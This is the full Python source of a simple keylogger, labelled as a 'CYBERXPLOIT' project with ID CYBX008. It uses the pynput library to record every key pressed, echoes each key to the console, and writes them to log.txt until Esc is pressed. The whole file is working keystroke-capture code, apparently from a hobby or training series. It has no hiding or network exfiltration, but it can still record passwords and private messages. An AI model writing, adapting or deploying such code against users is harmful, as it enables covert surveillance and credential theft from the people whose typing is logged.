############################################################
#####                   CYBERXPLOIT                    #####
##### PROJECT NAME: KEYLOGGER                          #####
##### PROJECT ID: CYBX008                              #####
#####                                                  #####
############################################################


#IMPORTING THE MODULE
import pynput
from pynput.keyboard import Key, Listener

#DECLARING VARIABLES
count = 0
keys = []

#ON PRESS FUNCTION(INPUTED KEYSTROKE)
def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print(f"{key} pressed")

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

#WRITING KEYSTROKE TO A TEXT FILE
def write_file(keys):
    with open("log.txt", 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:               
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k) 

#ON RELEASE FUNCTION              
def on_release(key):
    if key == Key.esc:
        return False  

#LISTENER BASED ON (ON PRESSED AND ON RELEASE OF KEYSTROKES)
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


############################################################
#####                   CYBERXPLOIT                    #####
##### PROJECT NAME: KEYLOGGER                          #####
##### PROJECT ID: CYBX008                              #####
#####                                                  #####
############################################################

 